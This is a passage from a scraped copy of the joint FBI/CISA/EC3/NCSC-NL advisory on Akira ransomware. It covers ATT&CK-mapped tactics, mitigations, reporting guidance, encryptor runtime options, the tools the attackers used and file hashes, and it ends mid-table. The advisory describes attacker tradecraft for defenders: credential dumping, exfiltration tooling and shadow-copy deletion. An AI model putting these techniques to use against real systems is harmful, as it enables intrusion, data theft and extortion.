<tr>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a></td>
<td>Akira threat actors leveraged RClone to sync files with cloud storage services to exfiltrate data.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Date Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>Akira threat actors encrypt data on target systems to interrupt availability to system and network resources.</td>
</tr>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1490\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>Akira threat actors delete volume shadow copies on Windows systems.</td>
</tr>
<tr>
<td>Financial Theft</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a></td>
<td>Akira threat actors use a double-extortion model for financial gain.</td>
</tr>
</tbody>
</table>
<h3><strong>MITIGATIONS</strong></h3>
<h4><strong>Network Defenders</strong></h4>
<p>The FBI, CISA, EC3, and NCSC-NL recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the risk of compromise by Akira ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud) [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">2.R</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentResponseIRPlans2S\" title=\"Incident Response (IR) Plans (2.S)\">2.S</a>].</li>
<li><strong>Require all accounts</strong> with password logins (e.g., service accounts, admin accounts, and domain admin accounts)&nbsp;<strong>to comply</strong> with NIST’s&nbsp;<a href=\"https://pages.nist.gov/800-63-3/\" target=\"_blank\" title=\"https://pages.nist.gov/800-63-3/\">standards</a>. In particular, require employees to use long passwords and consider not requiring recurring password changes, as these can weaken security&nbsp;[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#UniqueCredentials2C\" title=\"Unique Credentials (2.C)\">CPG 2.C</a>].</li>
<li><strong>Require multifactor authentication</strong> for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>].</li>
<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">known exploited vulnerabilities</a> in internet-facing systems. [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>].</li>
<li><strong>Segment networks</strong> to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>].</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li><strong>Filter network traffic</strong> by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents threat actors from directly connecting to remote access services that they have established for persistence.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus software</strong> on all hosts.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#AssetInventory1A\" title=\"Asset Inventory (1.A)\">CPG 1.A</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DocumentDeviceConfigurations2O\" title=\"Document Device Configurations (2.O)\">2.O</a>].</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li><strong>Disable unused</strong> <strong>ports</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#ProhibitConnectionofUnauthorizedDevices2V\" title=\"Prohibit Connection of Unauthorized Devices (2.V)\">CPG 2.V</a>].</li>
<li><strong>Consider adding an email banner to emails</strong> received from outside of your organization [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\" title=\"Email Security (2.M)\">CPG 2.M</a>].</li>
<li><strong>Disable hyperlinks</strong> in received emails.</li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the <a href=\"https://www.cisa.gov/zero-trust-maturity-model\" title=\"Zero Trust Maturity Model\">Zero Trust model</a>). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">2.N</a>].</li>
<li><strong>Maintain offline backups of data,</strong> and regularly maintain backup and restoration [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">CPG 2.R</a>]. By instituting this practice, the organization helps ensure they will not be severely interrupted, and/or only have irretrievable data.&nbsp;</li>
<li><strong>Ensure all backup data is encrypted, immutable</strong> (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#StrongandAgileEncryption2K\" title=\"Strong and Agile Encryption (2.K)\">CPG 2.K</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L\" title=\"Secure Sensitive Data (2.L)\">2.L</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">2.R</a>].</li>
</ul>
<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>
<p>In addition to applying mitigations, the FBI, CISA, EC3, and NCSC-NL recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The FBI, CISA, EC3 and NCSC-NL recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 6 -14).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The FBI, CISA, EC3, and NCSC-NL recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3><strong>RESOURCES</strong></h3>
<ul>
<li><a href=\"https://www.stopransomware.gov/\" title=\"#StopRansomware\">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to mitigate a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\" title=\"Joint Ransomware Task Force (JRTF) #StopRansomware Guide\">#StopRansomware Guide</a>.</li>
<li>No cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\" title=\"Cyber Hygiene Services\">Cyber Hygiene Services</a>, <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\" title=\"Ransomware Readiness Assessment CSET v10.3\">Ransomware Readiness Assessment</a>.</li>
</ul>
<h3><strong>REFERENCES</strong></h3>
<ol>
<li><a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira\" title=\"Ransomware Roundup - Akira\">Fortinet: Ransomware Roundup - Akira</a></li>
<li><a href=\"https://blogs.cisco.com/security/akira-ransomware-targeting-vpns-without-multi-factor-authentication\" title=\"Akira Ransomware Targeting VPNs without Multi-Factor Authentication\">Cisco: Akira Ransomware Targeting VPNs without MFA</a></li>
<li><a href=\"https://www.truesec.com/hub/blog/akira-ransomware-and-exploitation-of-cisco-anyconnect-vulnerability-cve-2020-3259\" title=\"Akira Ransomware and Exploitation of Cisco Anyconnect Vulnerability CVE-2020-3259\">Truesec: Indications of Akira Ransomware Group Actively Exploiting Cisco AnyConnect CVE-2020-3259</a></li>
<li><a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">TrendMicro: Akira Ransomware Spotlight</a></li>
<li><a href=\"https://www.crowdstrike.com/cybersecurity-101/kerberoasting/\" title=\"KERBEROASTING ATTACKS\">CrowdStrike: What is a Kerberoasting Attack?</a></li>
<li><a href=\"https://news.sophos.com/en-us/2023/12/21/akira-again-the-ransomware-that-keeps-on-taking/\" title=\"Akira, again: The ransomware that keeps on taking\">Sophos: Akira, again: The ransomware that keeps on taking</a></li>
<li><a href=\"https://news.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/\" title=\"Akira Ransomware is “bringin’ 1988 back”\">Sophos: Akira Ransomware is “bringin’ 1988 back”</a></li>
</ol>
<h3><strong>REPORTING</strong></h3>
<p>Your organization has no obligation to respond or provide information back to the FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Akira threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The FBI, CISA, EC3, and NCSC-NL do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s&nbsp;<a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, a local <u>FBI&nbsp;</u><a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">Field Office</a>, or CISA via the agency’s&nbsp;<a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h3><strong>DISCLAIMER</strong></h3>
<p>The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, EC3, and NCSC-NL do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI or CISA.</p>
<h3><strong>ACKNOWLEDGEMENTS</strong></h3>
<p>Cisco, Sophos, and Fortinet contributed to this advisory.</p>
<h3><strong>VERSION HISTORY</strong></h3>
<p>April 18, 2024: Initial version.</p>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a" (26143 48943) new 10 nil nil ((title nil "#StopRansomware: Akira Ransomware") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a") (description nil "<h3><strong>SUMMARY</strong></h3>
<p><em><strong>Note: </strong>This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The United States’ Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Europol’s European Cybercrime Centre (EC3), and the Netherlands’ National Cyber Security Centre (NCSC-NL)&nbsp;are releasing this joint CSA to disseminate known Akira ransomware&nbsp;IOCs and TTPs identified through FBI investigations and trusted third party reporting as recently as February 2024.</p>
<p>Since March 2023, Akira ransomware has impacted a wide range of businesses and critical infrastructure entities in North America, Europe, and Australia. In April 2023, following an initial focus on Windows systems,&nbsp;Akira threat actors deployed a Linux variant targeting VMware ESXi virtual machines. As of January 1, 2024, the ransomware group has impacted over 250 organizations and claimed approximately $42 million (USD) in ransomware proceeds.</p>
<p>Early versions of the Akira&nbsp;ransomware variant were written in C++ and encrypted files with a&nbsp;<code>.akira</code> extension; however, beginning in August 2023, some Akira attacks began deploying Megazord, using Rust-based code which encrypts files with a&nbsp;<code>.powerranges</code> extension.&nbsp;&nbsp;Akira threat actors have continued to use both Megazord and Akira, including Akira_v2 (identified by trusted third party investigations) interchangeably.</p>
<p>The FBI, CISA, EC3, and NCSC-NL encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/aa24-109a-stopransomware-akira-ransomware_2.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-109A #StopRansomware: Akira Ransomware</a>
    <span class=\"c-file__size\">(PDF,       591.05 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/AA24-109A.stix_0.xml\" class=\"c-file__link\" target=\"_blank\">AA24-109A STIX XML</a>
    <span class=\"c-file__size\">(XML,       114.01 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/AA24-109A-StopRansomware-Akira-Ransomware.stix_0.json\" class=\"c-file__link\" target=\"_blank\">AA24-109A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       67.80 KB
  )</span>
  </div>
</div>
<h3><strong>TECHNICAL DETAILS</strong></h3>
<p><strong>Note:</strong> This advisory uses the MITRE ATT&amp;CK® for Enterprise framework, version 14. See <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> for all referenced tactics and techniques.</p>
<h4><strong>Initial Access</strong></h4>
<p>The FBI and cybersecurity researchers have observed Akira threat actors obtaining initial access to organizations through a virtual private network (VPN) service without multifactor authentication (MFA) configured[<a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira\" title=\"Ransomware Roundup - Akira\">1</a>], mostly using known Cisco vulnerabilities [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>]&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-3259\" title=\"CVE-2020-3259\">CVE-2020-3259</a> and&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-20269\" title=\"CVE-2023-20269\">CVE-2023-20269</a>.[<a href=\"https://blogs.cisco.com/security/akira-ransomware-targeting-vpns-without-multi-factor-authentication\" title=\"Akira Ransomware Targeting VPNs without Multi-Factor Authentication\">2</a>],[<a href=\"https://www.truesec.com/hub/blog/akira-ransomware-and-exploitation-of-cisco-anyconnect-vulnerability-cve-2020-3259\" title=\"Akira Ransomware and Exploitation of Cisco Anyconnect Vulnerability CVE-2020-3259\">3</a>],[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>] Additional methods of initial access include the use of external-facing services such as Remote Desktop Protocol (RDP) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a>],&nbsp;spear phishing [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a>][<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a>], and the abuse of valid credentials[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>]</p>
<h4><strong>Persistence and Discovery</strong></h4>
<p>Once initial access is obtained, Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/002/\" title=\"Create Account: Domain Account\">T1136.002</a>] to establish persistence. In some instances, the FBI identified Akira threat actors creating an administrative account named <code>itadm</code>.</p>
<p>According to FBI and open source reporting, Akira threat actors leverage post-exploitation attack techniques, such as Kerberoasting[<a href=\"https://www.crowdstrike.com/cybersecurity-101/kerberoasting/\" title=\"KERBEROASTING ATTACKS\">5</a>], to extract credentials stored in the process memory of the Local Security Authority Subsystem Service (LSASS) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>]<a>.</a>[<a href=\"https://news.sophos.com/en-us/2023/12/21/akira-again-the-ransomware-that-keeps-on-taking/\" title=\"Akira, again: The ransomware that keeps on taking\">6</a>] Akira threat actors also use credential scraping tools [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>] like&nbsp;Mimikatz and&nbsp;LaZagne&nbsp;to aid in privilege escalation. Tools like SoftPerfect and Advanced IP Scanner are often used for network device discovery (reconnaissance) purposes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a>] and <code>net</code> Windows commands are used to identify domain controllers [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>] and gather information on domain trust relationships [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a>].</p>
<p>See Table 1 for a descriptive listing of these tools.</p>
<h4><strong>Defense Evasion</strong></h4>
<p>Based on trusted third party investigations, Akira threat actors have been observed deploying two distinct ransomware variants against different system architectures within the same compromise event. This marks a shift from recently reported Akira ransomware activity. Akira threat actors were first observed deploying the Windows-specific “Megazord” ransomware, with further analysis revealing that a second payload was concurrently deployed in this attack (which was later identified as a novel variant of the Akira ESXi encryptor, “Akira_v2”).</p>
<p>As Akira threat actors prepare for lateral movement, they commonly disable security software to avoid detection. Cybersecurity researchers have observed Akira threat actors using PowerTool to exploit the Zemana AntiMalware driver[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>] and terminate antivirus-related processes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</p>
<h4><strong>Exfiltration and Impact</strong></h4>
<p>Akira&nbsp;threat actors leverage tools such as&nbsp;FileZilla, WinRAR [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a>], WinSCP, and&nbsp;RClone to exfiltrate data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>]. To establish command and control channels, threat actors leverage readily available tools like AnyDesk, MobaXterm, RustDesk,&nbsp;Ngrok, and Cloudflare Tunnel, enabling exfiltration through various protocols such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1537\" title=\"Transfer Data to Cloud Account\">T1537</a>] to connect to exfiltration servers.</p>
<p>Akira threat actors use a double-extortion model [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a>] and encrypt systems [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>] after exfiltrating data. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via <code>a&nbsp;.onion</code> URL.&nbsp;Akira threat actors do not leave an initial ransom demand or payment instructions on compromised networks, and do not relay this information until contacted by the victim.&nbsp;Ransom payments are paid in Bitcoin to cryptocurrency wallet addresses provided by the threat actors. To further apply pressure, Akira threat actors threaten to publish exfiltrated data on the Tor network, and in some instances have called victimized companies, according to FBI reporting.</p>
<h4><strong>Encryption</strong></h4>
<p>Akira threat actors utilize a sophisticated hybrid encryption scheme to lock data. This involves combining a ChaCha20&nbsp;stream cipher with an RSA public-key cryptosystem for speed and secure key exchange [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. This multilayered approach tailors encryption methods based on file type and size and is capable of full or partial encryption.&nbsp;Encrypted files are appended with either a <code>.akira</code> or&nbsp;<code>.powerranges</code> extension. To further inhibit system recovery, Akira’s encryptor (<code>w.exe</code>) utilizes&nbsp;PowerShell commands to delete volume shadow copies (VSS) on Windows systems [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1490\" title=\"Inhibit System Recovery\">T1490</a>]. Additionally, a ransom note named&nbsp;<code>fn.txt</code> appears in both the root directory (<code>C:</code>) and each users’ home directory (<code>C:\\Users</code>).</p>
<p>Trusted third party analysis identified that the Akira_v2 encryptor is an upgrade from its previous version, which includes additional functionalities due to the language it’s written in (Rust). Previous versions of the encryptor provided options to insert arguments at runtime, including:</p>
<ul>
<li><code>-p --encryption_path (targeted file/folder paths)</code></li>
<li><code>-s --share_file (targeted network drive path)</code></li>
<li><code>-n --encryption_percent (percentage of encryption)</code></li>
<li><code>--fork (create a child process for encryption</code></li>
</ul>
<p>The ability to insert additional threads allows Akira threat actors to have more granular control over the number of CPU cores in use, increasing the speed and efficiency of the encryption process. The new version also adds a layer of protection, utilizing the Build ID as a run condition to hinder dynamic analysis. The encryptor is unable to execute successfully without the unique Build ID. The ability to deploy against only virtual machines using “<code>vmonly</code>” and the ability to stop running virtual machines with “<code>stopvm</code>” functionalities have also been observed implemented for Akira_v2. After encryption, the Linux ESXi variant may include the file extension “<code>akiranew</code>” or add a ransom note named “<code>akiranew.txt</code>” in directories where files were encrypted with the new nomenclature.</p>
<h4><strong>Leveraged Tools</strong></h4>
<p>Table 1 lists publicly available tools and applications Akira threat actors have used, including legitimate tools repurposed for their operations. Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Leveraged by Akira Ransomware Actors</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0552/\" title=\"AdFind\">AdFind</a></td>
<td><code>AdFind.exe</code> is used to query and retrieve information from Active Directory.</td>
</tr>
<tr>
<td>Advanced IP Scanner</td>
<td>A network scanner is used to locate all the computers on a network and conduct a scan of their ports. The program shows all network devices, gives access to shared folders, and provides remote control of computers (via RDP and Radmin).</td>
</tr>
<tr>
<td>AnyDesk</td>
<td>A common software that can be maliciously used by threat actors to obtain remote access and maintain persistence [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1219\" title=\"Remote Access Software\">T1219</a>]. AnyDesk also supports remote file transfer.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/software/S0349\" title=\"LaZagne\">LaZagne</a></td>
<td>Allows users to recover stored passwords on Windows, Linux, and OSX systems.</td>
</tr>
<tr>
<td>PCHunter64</td>
<td>A tool used to acquire detailed process and system information<a>&nbsp;[</a><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>].[<a href=\"https://news.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/\" title=\"Akira Ransomware is “bringin’ 1988 back”\">7</a>]</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">PowerShell</a></td>
<td>A cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0002/\" title=\"Mimikatz\">Mimikatz</a></td>
<td>Allows users to view and save authentication credentials such as Kerberos tickets.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0508/\" title=\"ngrok\">Ngrok</a></td>
<td>A reverse proxy tool [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1090/\" title=\"Proxy\">T1090</a>] used to create a secure tunnel to servers behind firewalls or local machines without a public IP address.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/software/S1040\" title=\"Rclone\">RClone</a></td>
<td>A command line program used to sync files with cloud storage services [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a>] such as Mega.</td>
</tr>
<tr>
<td>SoftPerfect</td>
<td>A network scanner (<code>netscan.exe</code>) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.</td>
</tr>
<tr>
<td>WinRAR</td>
<td>Used to split compromised data into segments and to compress [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a>] files into&nbsp;<code>.RAR</code> format for exfiltration.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Akira&nbsp;threat actors have used it to transfer data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>] from a compromised network to actor-controlled accounts.</td>
</tr>
</tbody>
</table>
<h4><strong>Indicators of Compromise</strong></h4>
<p><strong>Disclaimer:</strong> Investigation or vetting of these indicators is recommended prior to taking action, such as blocking.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2a: Malicious Files Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>File Name</strong></th>
<th role=\"columnheader\"><strong>Hash (SHA-256)</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>w.exe</td>
<td>d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca</td>
<td>Akira ransomware</td>
</tr>
<tr>
<td>Win.exe</td>
<td>dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e</td>
<td>Akira ransomware encryptor</td>
</tr>
<tr>
<td>AnyDesk.exe</td>
